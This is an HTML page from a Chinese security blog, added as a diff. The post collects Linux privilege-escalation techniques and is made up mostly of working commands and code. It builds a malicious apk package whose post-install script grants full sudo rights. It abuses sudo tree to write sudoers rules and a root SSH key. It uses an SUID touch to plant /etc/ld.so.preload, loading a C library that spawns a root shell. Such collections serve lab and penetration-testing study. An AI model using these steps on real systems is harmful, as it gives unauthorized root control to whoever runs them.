@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - suid sudo提权收集</title>
+        <meta name="description" content="apk 提权 准备sudo或suid apk环境 apk add sudo adduser demo echo &#039;demo ALL=(ALL) NOPASSWD: /sbin/apk&#039; &amp;gt;&amp;gt; /etc/sudoers.d/demo-apk 构造恶意安装包，准备利用.post-install脚本，在apk安装…">
+    <link rel="canonical" href="https://the0n3.top/posts/suid-sudo-collect/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="suid sudo提权收集">
+    <meta property="og:description" content="apk 提权 准备sudo或suid apk环境 apk add sudo adduser demo echo &#039;demo ALL=(ALL) NOPASSWD: /sbin/apk&#039; &amp;gt;&amp;gt; /etc/sudoers.d/demo-apk 构造恶意安装包，准备利用.post-install脚本，在apk安装…">
+    <meta property="og:url" content="https://the0n3.top/posts/suid-sudo-collect/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/suid-sudo-collect/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="suid sudo提权收集">
+    <meta name="twitter:description" content="apk 提权 准备sudo或suid apk环境 apk add sudo adduser demo echo &#039;demo ALL=(ALL) NOPASSWD: /sbin/apk&#039; &amp;gt;&amp;gt; /etc/sudoers.d/demo-apk 构造恶意安装包，准备利用.post-install脚本，在apk安装…">
+        <meta name="twitter:image" content="https://the0n3.top/images/suid-sudo-collect/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>suid sudo提权收集</h1>
+    <p>
+        <span class="meta">发布于: 2026-07-26 15:08</span>
+    </p>
+    <div class="post-body">
+        <h2>apk 提权</h2>
+<p>准备sudo或suid apk环境</p>
+<pre><code class="language-bash">apk add sudo
+adduser demo
+echo 'demo ALL=(ALL) NOPASSWD: /sbin/apk' &gt;&gt; /etc/sudoers.d/demo-apk</code></pre>
+<p>构造恶意安装包，准备利用.post-install脚本，在apk安装后会触发执行恶意脚本</p>
+<pre><code class="language-bash">mkdir -p /tmp/evil3 &amp;&amp; cd /tmp/evil3
+
+cat &gt; post.sh &lt;&lt;'EOF'
+#!/bin/sh
+# 以 root 身份执行的 payload：给当前用户添加完整 sudo 权限
+echo "demo ALL=(ALL) NOPASSWD: ALL" &gt; /etc/sudoers.d/demo-own
+chmod 0440 /etc/sudoers.d/demo-own
+EOF
+
+chmod +x post.sh</code></pre>
+<p>构建合法的 v3 恶意包</p>
+<pre><code class="language-bash">apk mkpkg \
+  --info "name:evil-pwn" \
+  --info "version:1.0.0-r0" \
+  --info "arch:x86_64" \
+  --script post-install:post.sh \
+  --output evil-pwn.apk</code></pre>
+<p>sudo apk 安装恶意包</p>
+<pre><code class="language-bash"># --allow-untrusted 跳过签名验证
+sudo apk add --allow-untrusted /tmp/evil3/evil-pwn.apk</code></pre>
+<p><img src="/images/suid-sudo-collect/1.png" alt="" decoding="async" width="1307" height="913"></p>
+<h2>tree 提权</h2>
+<p>sudo tree 提权</p>
+<pre><code class="language-bash">admin@debian:/tmp$ cd /tmp
+admin@debian:/tmp$ echo 'ALL ALL=(ALL) NOPASSWD: ALL' &gt; '#a'
+admin@debian:/tmp$ sudo /usr/bin/tree --fromfile --noreport -i -N '#a' -o /tmp/b</code></pre>
+<p>输出文件第一行会保留读取的文件名，可以通过給文件名加上 # 起到注释作用，在一些按行解析的配置文件里并不是必须的，如 sudoers 、authorized_keys 、passwd、shadow等配置文件按行解析，错误行不影响其他行生效</p>
+<p><img src="/images/suid-sudo-collect/3.png" alt="" decoding="async" loading="lazy" width="1070" height="281"></p>
+<p>写入新的 sudo 规则</p>
+<pre><code class="language-bash">admin@debian:/tmp$ cd /tmp
+admin@debian:/tmp$ echo 'ALL ALL=(ALL) NOPASSWD: ALL' &gt; /tmp/a
+admin@debian:/tmp$ sudo /usr/bin/tree --fromfile --noreport -i -N /tmp/a -o /etc/sudoers.d/demo-all</code></pre>
+<p><img src="/images/suid-sudo-collect/2.png" alt="" decoding="async" loading="lazy" width="1468" height="875"></p>
+<p>写入公钥</p>
+<pre><code class="language-bash">admin@debian:/tmp$ cd /tmp
+admin@debian:/tmp$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDb16r5xngn0dEVnW0dVEbc8hO84MvlE3o73qUZo+BJx ssh-ed25519-20260726153337' &gt; /tmp/a
+admin@debian:/tmp$ sudo /usr/bin/tree --fromfile --noreport -i -N /tmp/a -o /root/.ssh/authorized_keys</code></pre>
+<p><img src="/images/suid-sudo-collect/4.png" alt="" decoding="async" loading="lazy" width="1902" height="730"></p>
+<h2>touch 提权</h2>
+<p>suid touch 提权</p>
+<p>touch 默认创建的文件权限是 666，umask 022 的情况下，创建的文件权限是 644，umask 000 的情况下，创建的文件权限是 666，此时可以允许其他用户写入，但常见利用的方案如sudo、cron、ssh会因为权限松散拒绝生效</p>
+<p><img src="/images/suid-sudo-collect/5.png" alt="" decoding="async" loading="lazy" width="1067" height="805"></p>
+<p>ld.so.preload在666权限下仍然可以生效，在二进制文件执行前加载执行共享库。此方案适用范围：glibc 系 Linux：Debian、Ubuntu、Kali、CentOS，不适用范围：musl 系 Linux：Alpine</p>
+<pre><code class="language-bash">cat &gt; /tmp/pe.c &lt;&lt; 'EOF'
+// gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
+#include &lt;unistd.h&gt;
+
+__attribute__((constructor))
+void pwn()
+{
+    unlink("/etc/ld.so.preload");
+    setuid(0);
+    setgid(0);
+    execl("/bin/sh","sh",(char *)0);
+}
+EOF</code></pre>
+<p>编译生成共享库：</p>
+<pre><code class="language-bash">gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles</code></pre>
+<p>写入到 /etc/ld.so.preload 文件中</p>
+<pre><code class="language-bash">umask 000
+./touch /etc/ld.so.preload
+cat &gt; /etc/ld.so.preload &lt;&lt; 'EOF'
+/tmp/pe.so
+EOF
+su</code></pre>
+<p><img src="/images/suid-sudo-collect/6.png" alt="" decoding="async" loading="lazy" width="1487" height="883"></p>
+<p>参考：</p>
+<ul>
+<li><a href="https://blog.csdn.net/2301_79518550/article/details/145423339">touch 命令 suid 也能提权？教你一招基于库文件劫持的提权攻击！</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                            <span class="post-meta-item">标签:
+                                    <span>#suid</span>
+                                    <span>#sudo</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
